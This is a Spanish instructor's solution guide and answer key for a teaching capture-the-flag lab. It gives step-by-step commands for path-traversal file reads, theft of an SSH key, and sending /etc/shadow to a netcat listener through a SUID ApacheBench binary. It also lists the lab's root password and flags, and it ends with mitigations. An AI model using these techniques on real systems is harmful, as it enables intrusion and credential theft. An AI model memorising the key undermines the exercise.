# Nightfall — Solución y guía docente

> Este archivo contiene la cadena completa de explotación, la contraseña de
> root y las dos flags. No debe entregarse antes de la actividad.

## Resumen de la cadena

```text
Página pública
    ↓
Virtual host console.nightfall.local
    ↓
Enumeración de usuarios
    ↓
Redirect de console.php sin exit
    ↓
LFI con validación por cadena
    ↓
Clave SSH de archivist
    ↓
ab SUID para enviar /etc/shadow
    ↓
Crack de la contraseña de root
    ↓
root.txt
```

## 1. Levantar el entorno

Desde la carpeta del proyecto:

```bash
docker compose up --build -d
```

Verificar la página pública:

```bash
curl -i http://127.0.0.1:9001/
```

La página menciona el host:

```text
console.nightfall.local
```

Se puede agregar a `/etc/hosts` o utilizar directamente el header:

```bash
curl -i -H 'Host: console.nightfall.local' http://127.0.0.1:9001/
```

## 2. Enumeración de usuarios

La página `/profiles.html` muestra tres nombres. Probamos el formulario
de la consola con un usuario conocido y uno inventado:

```bash
curl -s -X POST \
  -d 'username=archivist&password=test' \
  -H 'Host: console.nightfall.local' \
  http://127.0.0.1:9001/signin.php

curl -s -X POST \
  -d 'username=not-a-user&password=test' \
  -H 'Host: console.nightfall.local' \
  http://127.0.0.1:9001/signin.php
```

La primera respuesta contiene `Invalid password.`; la segunda contiene
`Invalid username or password.`. Eso permite distinguir usuarios
existentes, aunque en este reto no es necesario obtener una contraseña por
fuerza bruta.

## 3. Bypass de la consola mediante la respuesta de redirección

Solicitar `console.php` mostrando headers y cuerpo:

```bash
curl -i -H 'Host: console.nightfall.local' \
  http://127.0.0.1:9001/console.php
```

La respuesta tiene un status `302 Found` y un header similar a:

```text
Location: /signin.php
```

Sin embargo, el cuerpo también contiene el panel y un enlace a:

```text
/vault/records.php?source=logs/ops.log
```

La causa es que `console.php` ejecuta `header()` pero no
termina el script con `exit`. Un navegador normalmente sigue el
redirect y oculta el cuerpo. Con `curl` o interceptando la respuesta
en Burp podemos leerlo.

## 4. Explotar el LFI con approved path

Probar primero el archivo esperado:

```bash
curl -s -G -H 'Host: console.nightfall.local' \
  --data-urlencode 'source=logs/ops.log' \
  http://127.0.0.1:9001/vault/records.php
```

El endpoint sólo verifica que el parámetro contenga la cadena `logs/`:

```php
if (strpos($source, 'logs/') === false) {
    exit('Illegal source specified');
}
```

No normaliza el path con `realpath()` ni comprueba que el archivo final
permanezca dentro del directorio permitido. Por eso se puede conservar la
cadena aprobada y usar traversal:

```bash
curl -s -G -H 'Host: console.nightfall.local' \
  --data-urlencode 'source=./logs/../../../../etc/passwd' \
  http://127.0.0.1:9001/vault/records.php
```

La ruta se construye desde `/var/www/console`. Después de normalizar
`./logs/../../../../etc/passwd`, el destino real es
`/etc/passwd`.

## 5. Recuperar la clave SSH

El usuario útil del sistema es `archivist`. Pedimos su clave privada:

```bash
curl -s -G -H 'Host: console.nightfall.local' \
  --data-urlencode 'source=./logs/../../../../home/archivist/.ssh/id_ed25519' \
  http://127.0.0.1:9001/vault/records.php \
  > archivist_id_ed25519

chmod 600 archivist_id_ed25519
head -1 archivist_id_ed25519
```

La respuesta debe comenzar con:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

Conectarse por SSH al puerto publicado por Docker:

```bash
ssh -i archivist_id_ed25519 -p 2222 \
  -o StrictHostKeyChecking=no \
  archivist@127.0.0.1
```

Leer la primera flag:

```bash
cat /home/archivist/user.txt
```

Resultado esperado:

```text
FLAG{nightfall_ssh_path_4b7a}
```

## 6. Enumerar SUID

Desde la sesión SSH:

```bash
find / -perm -4000 -type f 2>/dev/null | sort
ls -l /usr/bin/ab
```

El resultado relevante es similar a:

```text
-rwsr-xr-x 1 root root ... /usr/bin/ab
```

`ab` es ApacheBench. En este laboratorio quedó instalado con SUID
`root`. Su opción `-p` permite enviar el contenido de un
archivo como cuerpo de una petición HTTP.

## 7. Enviar `/etc/shadow` al host local

Abrir una segunda terminal en la máquina anfitriona, dentro de la carpeta
`nightfall`:

```bash
nc -lvnp 4444 > shadow.request
```

Mantener ese listener activo y, desde la sesión SSH dentro del contenedor,
ejecutar:

```bash
/usr/bin/ab -n 1 -p /etc/shadow \
  http://host.docker.internal:4444/shadow
```

La entrada `host.docker.internal` está configurada en
`docker-compose.yml` para apuntar al host local. Si tu instalación de
Docker no reconoce `host-gateway`, reemplázala por la IP de la puerta
de enlace de Docker que sea accesible desde el contenedor.

Detener el listener con `Ctrl+C` y extraer la línea de root:

```bash
grep '^root:' shadow.request > root.hash
cat root.hash
```

## 8. Crack de la contraseña y acceso root

El laboratorio incluye una wordlist pequeña para que esta etapa sea
reproducible sin descargar archivos externos:

```bash
john --format=crypt \
  --wordlist=wordlists/nightfall.txt \
  root.hash

john --show root.hash
```

La contraseña encontrada es:

```text
nightfall42
```

Con ella se puede abrir una sesión root por el puerto SSH publicado:

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@127.0.0.1
```

Leer la segunda flag:

```bash
cat /root/root.txt
```

Resultado esperado:

```text
FLAG{nightfall_ab_shadow_90c2}
```

## Explicación técnica

### Virtual host y bypass

Apache sirve dos sitios. La página pública revela el nombre del segundo host.
La consola comprueba una variable de sesión, pero la respuesta de redirect no
termina la ejecución:

```php
if (!($_SESSION['active'] ?? false)) {
    header('Location: /signin.php');
}
```

El cuerpo protegido termina incluido en la respuesta 302. Esto es una mala
implementación del control de acceso; la corrección sería emitir el redirect y
llamar inmediatamente a `exit`.

### LFI

El endpoint usa una comprobación de substring para validar un supuesto
directorio permitido. Como no canonicaliza la ruta antes de leerla, una cadena
como `./logs/../../../../etc/passwd` mantiene la palabra esperada y
termina fuera del directorio autorizado.

### SSH

La clave privada del usuario quedó con permisos de lectura para otros usuarios.
El LFI puede recuperarla, y la clave permite entrar como `archivist`.

### Escalada con `ab`

El binario `/usr/bin/ab` tiene el bit SUID y propietario root. Al usar
`-p /etc/shadow`, el proceso privilegiado puede leer el archivo y enviarlo
al listener local. Después se crackea el hash de root y se usa la contraseña
para iniciar sesión.

## Mitigaciones

- Terminar el flujo después de cualquier redirect de control de acceso.
- No revelar diferencias entre usuario inexistente y contraseña incorrecta.
- Usar autorización en cada endpoint sensible, no sólo ocultar enlaces.
- Resolver rutas con `realpath()` y verificar que queden dentro de un
  directorio base permitido.
- Nunca guardar claves privadas con permisos globalmente legibles.
- No instalar herramientas de diagnóstico con SUID root.
- Deshabilitar login SSH de root y preferir llaves administradas con mínimo
  privilegio.
